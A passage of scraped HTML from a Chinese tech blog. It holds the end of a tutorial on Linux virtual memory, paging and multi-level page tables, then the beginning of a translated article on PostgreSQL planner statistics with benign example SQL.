Memory）。所谓的“随机读取”，是指存储器的读取时间和数据所在位置无关。与之相对，很多存储器的读取时间和数据所在位置有关。就拿磁带来说，我们想听其中的一首歌，必须转动带子。如果那首歌是第一首，那么立即就可以播放。如果那首歌恰巧是最后一首，我们快进到可以播放的位置就需要花很长时间。我们已经知道，进程需要调用内存中不同位置的数据。如果数据读取时间和位置相关的话，计算机就很难把控进程的运行时间。因此，随机读取的特性是内存成为主存储器的关键因素。</p>\n<p>内存提供的存储空间，除了能满足内核的运行需求，还通常能支持运行中的进程。即使进程所需空间超过内存空间，内存空间也可以通过少量拓展来弥补。换句话说，内存的存储能力，和计算机运行状态的数据总量相当。内存的缺点是不能持久地保存数据。一旦断电，内存中的数据就会消失。因此，计算机即使有了内存这样一个主存储器，还是需要硬盘这样的外部存储器来提供持久的储存空间。</p>\n<h3>虚拟内存</h3>\n<p>内存的一项主要任务，就是存储进程的相关数据。我们之前已经看到过进程空间的程序段、全局数据、栈和堆，以及这些这些存储结构在进程运行中所起到的关键作用。有趣的是，尽管进程和内存的关系如此紧密，但进程并不能直接访问内存。在Linux下，进程不能直接读写内存中地址为0x1位置的数据。进程中能访问的地址，只能是虚拟内存地址（virtual memory address）。操作系统会把虚拟内存地址翻译成真实的内存地址。这种内存管理方式，称为虚拟内存（virtual memory）。</p>\n<p>每个进程都有自己的一套虚拟内存地址，用来给自己的进程空间编号。进程空间的数据同样以字节为单位，依次增加。从功能上说，虚拟内存地址和物理内存地址类似，都是为数据提供位置索引。进程的虚拟内存地址相互独立。因此，两个进程空间可以有相同的虚拟内存地址，如0x10001000。虚拟内存地址和物理内存地址又有一定的对应关系，如图1所示。对进程某个虚拟内存地址的操作，会被CPU翻译成对某个具体内存地址的操作。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/b017014a91fca7de4a4d2432c6b7913a.png\" alt=\"\" width=\"420\" height=\"206\"></p>\n<p style=\"text-align: center\">图1 虚拟内存地址和物理内存地址的对应</p>\n<p>应用程序来说对物理内存地址一无所知。它只可能通过虚拟内存地址来进行数据读写。程序中表达的内存地址，也都是虚拟内存地址。进程对虚拟内存地址的操作，会被操作系统翻译成对某个物理内存地址的操作。由于翻译的过程由操作系统全权负责，所以应用程序可以在全过程中对物理内存地址一无所知。因此，C程序中表达的内存地址，都是虚拟内存地址。比如在C语言中，可以用下面指令来打印变量地址：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b624c6b700f5779044158\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint v = 0;\r\nprintf(\"%p\", (void*)&amp;v);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b624c6b700f5779044158-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b624c6b700f5779044158-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b624c6b700f5779044158-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b624c6b700f5779044158-2\"><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%p\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p>本质上说，虚拟内存地址剥夺了应用程序自由访问物理内存地址的权利。进程对物理内存的访问，必须经过操作系统的审查。因此，掌握着内存对应关系的操作系统，也掌握了应用程序访问内存的闸门。借助虚拟内存地址，操作系统可以保障进程空间的独立性。只要操作系统把两个进程的进程空间对应到不同的内存区域，就让两个进程空间成为“老死不相往来”的两个小王国。两个进程就不可能相互篡改对方的数据，进程出错的可能性就大为减少。</p>\n<p>另一方面，有了虚拟内存地址，内存共享也变得简单。操作系统可以把同一物理内存区域对应到多个进程空间。这样，不需要任何的数据复制，多个进程就可以看到相同的数据。内核和共享库的映射，就是通过这种方式进行的。每个进程空间中，最初一部分的虚拟内存地址，都对应到物理内存中预留给内核的空间。这样，所有的进程就可以共享同一套内核数据。共享库的情况也是类似。对于任何一个共享库，计算机只需要往物理内存中加载一次，就可以通过操纵对应关系，来让多个进程共同使用。IPO中的共享内存，也有赖于虚拟内存地址。</p>\n<h3>内存分页</h3>\n<p>虚拟内存地址和物理内存地址的分离，给进程带来便利性和安全性。但虚拟内存地址和物理内存地址的翻译，又会额外耗费计算机资源。在多任务的现代计算机中，虚拟内存地址已经成为必备的设计。那么，操作系统必须要考虑清楚，如何能高效地翻译虚拟内存地址。</p>\n<p>记录对应关系最简单的办法，就是把对应关系记录在一张表中。为了让翻译速度足够地快，这个表必须加载在内存中。不过，这种记录方式惊人地浪费。如果树莓派1GB物理内存的每个字节都有一个对应记录的话，那么光是对应关系就要远远超过内存的空间。由于对应关系的条目众多，搜索到一个对应关系所需的时间也很长。这样的话，会让树莓派陷入瘫痪。</p>\n<p>因此，Linux采用了分页（paging）的方式来记录对应关系。所谓的分页，就是以更大尺寸的单位页（page）来管理内存。在Linux中，通常每页大小为4KB。如果想要获取当前树莓派的内存页大小，可以使用命令：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b624c6b70102935209589\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$getconf PAGE_SIZE</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b624c6b70102935209589-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b624c6b70102935209589-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">getconf </span><span class=\"crayon-v\">PAGE_SIZE</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n\n</div>\n<p>得到结果，即内存分页的字节数：</p>\n<blockquote><p><em id=\"__mceDel\">4096</em></p></blockquote>\n<p>返回的4096代表每个内存页可以存放4096个字节，即4KB。Linux把物理内存和进程空间都分割成页。</p>\n<p>内存分页，可以极大地减少所要记录的内存对应关系。我们已经看到，以字节为单位的对应记录实在太多。如果把物理内存和进程空间的地址都分成页，内核只需要记录页的对应关系，相关的工作量就会大为减少。由于每页的大小是每个字节的4000倍。因此，内存中的总页数只是总字节数的四千分之一。对应关系也缩减为原始策略的四千分之一。分页让虚拟内存地址的设计有了实现的可能。</p>\n<p>无论是虚拟页，还是物理页，一页之内的地址都是连续的。这样的话，一个虚拟页和一个物理页对应起来，页内的数据就可以按顺序一一对应。这意味着，虚拟内存地址和物理内存地址的末尾部分应该完全相同。大多数情况下，每一页有4096个字节。由于4096是2的12次方，所以地址最后12位的对应关系天然成立。我们把地址的这一部分称为偏移量（offset）。偏移量实际上表达了该字节在页内的位置。地址的前一部分则是页编号。操作系统只需要记录页编号的对应关系。</p>\n<p style=\"text-align: center\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/c3b996a8b26918293109b8662e1f721b.png\" alt=\"\" width=\"532\" height=\"402\"><br>\n图2 地址翻译过程</p>\n<h3>多级分页表</h3>\n<p>内存分页制度的关键，在于管理进程空间页和物理页的对应关系。操作系统把对应关系记录在分页表（page table）中。这种对应关系让上层的抽象内存和下层的物理内存分离，从而让Linux能灵活地进行内存管理。由于每个进程会有一套虚拟内存地址，那么每个进程都会有一个分页表。为了保证查询速度，分页表也会保存在内存中。分页表有很多种实现方式，最简单的一种分页表就是把所有的对应关系记录到同一个线性列表中，即如图2中的“对应关系”部分所示。</p>\n<p>这种单一的连续分页表，需要给每一个虚拟页预留一条记录的位置。但对于任何一个应用进程，其进程空间真正用到的地址都相当有限。我们还记得，进程空间会有栈和堆。进程空间为栈和堆的增长预留了地址，但栈和堆很少会占满进程空间。这意味着，如果使用连续分页表，很多条目都没有真正用到。因此，Linux中的分页表，采用了多层的数据结构。多层的分页表能够减少所需的空间。</p>\n<p>我们来看一个简化的分页设计，用以说明Linux的多层分页表。我们把地址分为了页编号和偏移量两部分，用单层的分页表记录页编号部分的对应关系。对于多层分页表来说，会进一步分割页编号为两个或更多的部分，然后用两层或更多层的分页表来记录其对应关系，如图3所示。</p>\n<p style=\"text-align: center\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/36d635123634d7505ddb1dc5f8146bfe.png\" alt=\"\" width=\"369\" height=\"444\"> 图3 多层分页表</p>\n<p style=\"text-align: center\">\n</p><p style=\"text-align: left\">在图3的例子中，页编号分成了两级。第一级对应了前8位页编号，用2个十六进制数字表示。第二级对应了后12位页编号，用3个十六进制编号。二级表记录有对应的物理页，即保存了真正的分页记录。二级表有很多张，每个二级表分页记录对应的虚拟地址前8位都相同。比如二级表0x00，里面记录的前8位都是0x00。翻译地址的过程要跨越两级。我们先取地址的前8位，在一级表中找到对应记录。该记录会告诉我们，目标二级表在内存中的位置。我们再在二级表中，通过虚拟地址的后12位，找到分页记录，从而最终找到物理地址。</p>\n<p>多层分页表就好像把完整的电话号码分成区号。我们把同一地区的电话号码以及对应的人名记录同通一个小本子上。再用一个上级本子记录区号和各个小本子的对应关系。如果某个区号没有使用，那么我们只需要在上级本子上把该区号标记为空。同样，一级分页表中0x01记录为空，说明了以0x01开头的虚拟地址段没有使用，相应的二级表就不需要存在。正是通过这一手段，多层分页表占据的空间要比单层分页表少了很多。<br>\n多层分页表还有另一个优势。单层分页表必须存在于连续的内存空间。而多层分页表的二级表，可以散步于内存的不同位置。这样的话，操作系统就可以利用零碎空间来存储分页表。还需要注意的是，这里简化了多层分页表的很多细节。最新Linux系统中的分页表多达3层，管理的内存地址也比本章介绍的长很多。不过，多层分页表的基本原理都是相同。</p>\n<p>综上，我们了解了内存以页为单位的管理方式。在分页的基础上，虚拟内存和物理内存实现了分离，从而让内核深度参与和监督内存分配。应用进程的安全性和稳定性因此大为提高。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114225\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114225votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114225\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"url_object_id": "c22f24194b40ae376ad2e2d388945335", "title": ["10 个你不知道的 PostgreSQL 功能：创建统计信息"], "url": "http://blog.jobbole.com/114232/", "create_date": "2018/07/26", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/03/PostgreSQL-logo.gif"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "IT技术, PostgreSQL, 数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.citusdata.com/blog/2018/03/06/postgres-planner-and-its-usage-of-statistics/\">Samay Sharma</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/postgres-planner-and-its-usage-of-statistics\">开源中国</a>   </div><p>如果你曾使用 Postgres 做过一些性能优化，你或许已经使用过 EXPLAIN 。EXPLAIN 向你展示了 PostgreSQL planner 为提供的语句生成的执行计划。它说明了语句涉及到的表将会使用顺序扫描、索引扫描等方式进行扫描，在使用多表的情况下将会使用连接算法。但是， Postgres 是如何产生这些规划的？</p>\n<p>决定使用哪种规划的一个非常重要的输入是 planner 收集到的<a href=\"https://www.postgresql.org/docs/10/static/planner-stats.html\" target=\"_blank\" rel=\"nofollow\">数据统计</a>。这些统计的数据能够使 planner 评估执行规划的某一部分会返回多少行，继而影响到使用哪一种规划或连接算法。它们主要是通过运行 ANALYZE 或 VACUUM（和一些 DDL 命令，比如说 CREATE INDEX )来采集或更新的。</p>\n<p>这些统计信息由 planner 存储在 <a href=\"https://www.postgresql.org/docs/9.3/static/catalog-pg-class.html\" rel=\"nofollow\">pg_class</a> 和 <a href=\"https://www.postgresql.org/docs/10/static/catalog-pg-statistic.html\" rel=\"nofollow\">pg_statistics</a> 中。Pg_class 基本上存储了每个表和索引中的条目总数，以及它们所占用的磁盘块数。Pg_statistic 存储关于每列的统计信息，例如哪些列的 % 值为 nul l，哪些是最常见的值，直方图边界等。你可以查看下面的示例，以了解 Postgres 在下表中为 col1 收集的统计信息类型。下面的查询输出展示了 planner（正确地）预估表中列 col1 中有 1000 个不同的值，并且还对最常见的值、频率等进行了其他预估。</p>\n<p>请注意，我们已经查询了 <a href=\"https://www.postgresql.org/docs/10/static/view-pg-stats.html\" rel=\"nofollow\">pg_stats</a>（一个拥有更多可读版本的列统计信息的视图）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae34571102076048\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE tbl (                                                                        \r\n    col1 int,                                                                             \r\n    col2 int                                                                              \r\n);                                                                                        \r\n\r\nINSERT INTO tbl SELECT i/10000, i/100000                                                  \r\nFROM generate_series (1,10000000) s(i);                                                   \r\n\r\nANALYZE tbl;                                     \r\n\r\nselect * from pg_stats where tablename = 'tbl' and attname = 'col1';\r\n-[ RECORD 1 ]----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\nschemaname             | public\r\ntablename              | tbl\r\nattname                | col1\r\ninherited              | f\r\nnull_frac              | 0\r\navg_width              | 4\r\nn_distinct             | 1000\r\nmost_common_vals       | {318,564,596,...}\r\nmost_common_freqs      | {0.00173333,0.0017,0.00166667,0.00156667,...}\r\nhistogram_bounds       | {0,8,20,30,39,...}\r\ncorrelation            | 1\r\nmost_common_elems      | \r\nmost_common_elem_freqs | \r\nelem_count_histogram   |</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae34571102076048-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae34571102076048-26\">26</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-1\"><span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">TABLE</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-sy\">(</span>                                                                        </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-2\">    <span class=\"crayon-i\">col1</span> <span class=\"crayon-t\">int</span><span class=\"crayon-sy\">,</span>                                                                             </div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-3\">    <span class=\"crayon-i\">col2</span> <span class=\"crayon-t\">int</span>                                                                              </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-4\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span>                                                                                        </div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-6\"><span class=\"crayon-i\">INSERT</span> <span class=\"crayon-i\">INTO</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">i</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">i</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">100000</span>                                                  </div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-7\"><span class=\"crayon-i\">FROM</span> <span class=\"crayon-v\">generate</span><span class=\"crayon-sy\">_</span>series <span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">10000000</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-e\">s</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span>                                                   </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-9\"><span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span>                                     </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b625fae34571102076048-11\"><span class=\"crayon-i\">select</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-v\">pg</span><span class=\"crayon-sy\">_</span>stats <span class=\"crayon-i\">where</span> <span class=\"crayon-i\">tablename</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'tbl'</span> <span class=\"crayon-st\">and</span> <span class=\"crayon-i\">attname</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'col1'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae34571102076048-12\"><span class=\"crayon-o\">-</span><span class=\"crayon-sy\">[</span> <span class=\"crayon-i\">RECORD</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-sy\">]</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span 